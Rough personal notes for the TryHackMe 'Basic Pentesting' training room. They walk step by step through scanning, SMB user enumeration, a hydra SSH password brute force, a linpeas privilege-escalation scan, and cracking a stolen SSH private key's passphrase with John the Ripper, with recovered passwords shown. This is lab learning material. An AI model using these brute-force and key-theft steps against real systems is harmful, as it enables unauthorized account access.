  https://tryhackme.com
  zam    6Gp_3 2
  https://www.youtube.com/watch?v=20YIIiQp4J8&list=PLTZ4Y_SpVJv8h6AOI42ju-Cw2ez-57CIn&index=1
  
  
 hammond https://www.youtube.com/watch?v=xl2Xx5YOKcI&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if
 
 
 https://tryhackme.com/rooms
 https://tryhackme.com/room/whatisnetworking
 
 Basic Pentesting
 ===========================
 https://tryhackme.com/room/basicpentestingjt


This is a machine that allows you to practise web app hacking and privilege escalation הַסְלָמָה 
 https://youtu.be/xl2Xx5YOKcI?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=419
 
 
 Run  server:   sudo openvpn  <name of ovpn.ovpn>

 ip:  10.10.43.220     #10.10.205.158
1. ping    10.10.43.220
2. nmap -sC -sV -oN   ./initial   10.10.43.220
results:
   PORT     STATE SERVICE     VERSION
   22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
   80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
  139/tcp   open  netbios-ssn Samba smbd 4.6.2
  445/tcp   open  netbios-ssn Samba smbd 4.6.2
  8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
  8080/tcp open  http         Apache Tomcat 9.0.7
 
3. open  10.10.205.158 in web browser. 
 results: Web page : "Undergoing maintenance"
 
4. Page source: <html>
    	<h1>Undergoing maintenance</h1>
		<h4>Please check back later</h4>
		<!-- Check our dev note section if you need to know what
    		to work on. -->
 		</html> 
5. gobuster dir -u "http://10.10.43.220" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


   results:
   /development          (Status: 301) [Size: 318] [--> http://10.10.43.220/development/]
   /server-status        (Status: 403) [Size: 277]
  
       
	open http://10.10.43.220/development/
   results:  2 files  	dev.txt	,j.txt
 
 ‘dev.txt’ file:   conversations between -J and -K. From this, we understand that they are using Apache version 2.5.12 on the website.
  ‘j.txt’ file:  we read that -J’s password is weak. This gives us a lead to proceed.  
  
  
  open http://10.10.151.122/server-status
     results: Forbidden  Apache/2.4.41 (Ubuntu) Server at 10.10.151.122 Port 80
	 
	 
	 
6.enum4linux  (similar    to enum.exe  )
     obtaining information about SMB and Windows systems.



	 enum4linux -a <ip> #10.10.151.122

results:
   A very long list. At the end tou fill the next lines:
   [+] Enumerating users using SID S-1-22-1 and logon username '', password ''

		S-1-22-1-1000 Unix User\kay (Local User)
		S-1-22-1-1001 Unix User\jan (Local User)
		S-1-22-1-1002 Unix User\ubuntu (Local User)
   We can see from the results that the users -J and -K are actually Jan and Kay. We had learned that Jan’s password is weak. To crack the password, we will use a tool called “hydra.” Hydra is a widely used tool for cracking passwords in network systems.
   
7.  sudo hydra -l   <user name>  -P  <word list file>  ssh<ip>
   sudo hydra -l   jan   -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  ssh://10.10.151.122
 

   results:   [22][ssh] host: 10.10.151.122   login: jan  password: armando

8. login using ssh jan@10.10.141.152   with passward: armando
 cat /etc/passwd



8. Enumerate the machine to find any vectors for privilege escalation.
    
	LinEnum: Scripted Local Linux Enumeration ...
  download linpeas  
  wget https://github.com/peass-ng/PEASS-ng/releases/download/20251017-d864f4c3/linpeas.sh

  copy from the local to remote with the next command :
     scp ./linpeas.sh jan@10.10.141.152:/dev/shm 
SCP, (Secure Copy Protocol), transfer files between  between two remote systems. It uses SSH for encryption 

  cd  /dev/shm
  chmod +x linpeas.sh
  ./linpeas.sh | tee lilog.txt
  
results:  the output is a very long list
    At the middle we will find the next lines :
   "Possible private SSH keys were found! /home/kay/.ssh/id_rsa"
    so 'kay' has a private key.

 
cd /home/kay/.ssh
cat id_rsa   # output private key 

With the RSA key, we can directly access Kay’s account through an SSH connection without entering 
a password.
 copy the content of Kay’s RSA key to a local file named “a.txt” on our own terminal. 
   
   
 With the RSA key, we can directly access Kay’s account through an SSH connection without entering 
 a password. 
 We save Kay’s RSA key to a file named “a.txt” on our own terminal.
 When we attempt to connect to Kay’s account using the RSA key, 
 we notice that the RSA key is also protected by a passphrase.   
   
   First, we need to crack this passphrase. For this purpose, we can use the 
   “ssh2john” tool from “John the Ripper.” John the Ripper is a commonly used tool for password
   cracking on Unix-based systems. Initially, the RSA key, together with ssh2john, 
   will be transformed into a format that John the Ripper can crack. 
   We save the output to a text file named “decrypted1.txt.” Then, we instruct John the Ripper
   to attempt to crack the passphrase by providing the commonly used “rockyou.txt” wordlist. 

chmod 600 a.txt
ssh2john a.txt > decrypted1.txt
run  John the Ripper to attempt to crack the passphrase by providing the commonly used 
“rockyou.txt” wordlist.
sudo john --wordlist=/usr/share/wordlists/rockyou.txt  decrypted1.txt

result:
  beeswax          (a.txt)     
  
in 'kay' dir= /home/kat/.ssh   
 run:  
     ssh -i /home/kay/.ssh/id_rsa  kay@<host ip>         #10.10.170.185

input the pass 'beeswax'
10.10.170.185
https://medium.com/@aycagl/basic-pentesting-walkthrough-tryhackme-f37a530bfce5
   
   https://youtu.be/xl2Xx5YOKcI?t=1514